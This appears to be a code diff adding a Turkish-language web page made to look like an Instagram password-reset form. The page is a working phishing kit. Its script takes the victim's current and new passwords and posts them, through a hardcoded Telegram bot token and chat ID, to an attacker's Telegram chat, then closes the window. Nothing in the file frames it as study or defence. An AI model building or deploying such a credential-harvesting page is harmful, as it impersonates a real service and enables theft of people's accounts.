@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Şifre Yenileme</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .header {
+            width: 100%;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .header img {
+            height: 30px;
+            margin-right: 10px;
+            border-radius: 50%;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            max-width: 300px;
+            width: 100%;
+            text-align: center;
+        }
+        .container h1 {
+            margin-bottom: 10px;
+        }
+        .container p {
+            margin-bottom: 20px;
+            color: #666;
+            font-size: 0.9em;
+        }
+        .container input {
+            width: calc(100% - 40px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            display: inline-block;
+        }
+        .container .input-container {
+            position: relative;
+            margin: 10px 0;
+        }
+        .container .input-container i {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+        .container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #004080; /* Koyu mavi */
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .container button:hover {
+            background-color: #0066cc; /* Soluk mavi */
+        }
+        .error {
+            color: red;
+            margin-bottom: 10px;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <img src="/mnt/data/file-63woTL5knCOTKOtKlnpmyMyO" alt="𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" style="height: 30px;">
+</div>
+
+<div class="container">
+    <h1>Güçlü Bir Şifre Oluştur</h1>
+    <p>Şifren en az 6 karakter uzunluğunda olmalıdır.</p>
+    <div id="error" class="error"></div>
+    <form id="resetForm">
+        <div class="input-container">
+            <input type="password" id="existingCode" name="existingCode" placeholder="Mevcut şifre" required>
+            <i class="eye-icon" id="toggleExistingCode">👁️</i>
+        </div>
+        <div class="input-container">
+            <input type="password" id="newCode" name="newCode" placeholder="Yeni şifre" required>
+            <i class="eye-icon" id="toggleNewCode">👁️</i>
+        </div>
+        <div class="input-container">
+            <input type="password" id="newCodeRepeat" name="newCodeRepeat" placeholder="Yeni şifre, tekrar" required>
+            <i class="eye-icon" id="toggleNewCodeRepeat">👁️</i>
+        </div>
+        <button type="submit">Şifreni Yenile</button>
+    </form>
+</div>
+
+<script>
+    document.getElementById('resetForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        
+        const existingCode = document.getElementById('existingCode').value;
+        const newCode = document.getElementById('newCode').value;
+        const newCodeRepeat = document.getElementById('newCodeRepeat').value;
+        const errorDiv = document.getElementById('error');
+
+        // Hata mesajını temizle
+        errorDiv.textContent = '';
+
+        // Şifrelerin eşleşip eşleşmediğini kontrol et
+        if (newCode !== newCodeRepeat) {
+            errorDiv.textContent = 'Yeni şifre ve yeni şifre tekrarı aynı değil!';
+        } else {
+            // Şifrenin uzunluğunu kontrol et
+            if (newCode.length < 6) {
+                errorDiv.textContent = 'Şifre en az 6 karakter uzunluğunda olmalıdır.';
+            } else {
+                // Telegram botuna veri gönderme
+                const botToken = '7006907419:AAHHzh_uqt-32swzKosWe5poB7yo1O01EyE';  // Bot token'ı
+                const chatId = '6284677935';     // Chat ID
+                const message = `Yeni şifre yenileme talebi:\n\nMevcut Şifre: ${existingCode}\nYeni Şifre: ${newCode}`;
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('Şifre başarıyla yenilendi ve Telegram botuna gönderildi.');
+                    } else {
+                        errorDiv.textContent = 'Bir hata oluştu, lütfen tekrar deneyin.';
+                    }
+                })
+                .catch(error => {
+                    console.error('Hata:', error);
+                    errorDiv.textContent = 'Bir hata oluştu, lütfen tekrar deneyin.';
+                });
+
+                // Tarayıcıyı kapat
+                window.close();
+            }
+        }
+    });
+
+    // Göz simgeleri için şifre görünürlük toggle işlevi
+    function togglePasswordVisibility(inputId, iconId) {
+        const input = document.getElementById(inputId);
+        const icon = document.getElementById(iconId);
+
+        icon.addEventListener('click', () => {
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.textContent = '👁️'; // Göz simgesini değiştirme
+            } else {
+                input.type = 'password';
+                icon.textContent = '🙈'; // Gizli simgeyi değiştirme
+            }
+        });
+    }
+
+    togglePasswordVisibility('existingCode', 'toggleExistingCode');
+    togglePasswordVisibility('newCode', 'toggleNewCode');
+    togglePasswordVisibility('newCodeRepeat', 'toggleNewCodeRepeat');
+</script>
+
+</body>
+</html>
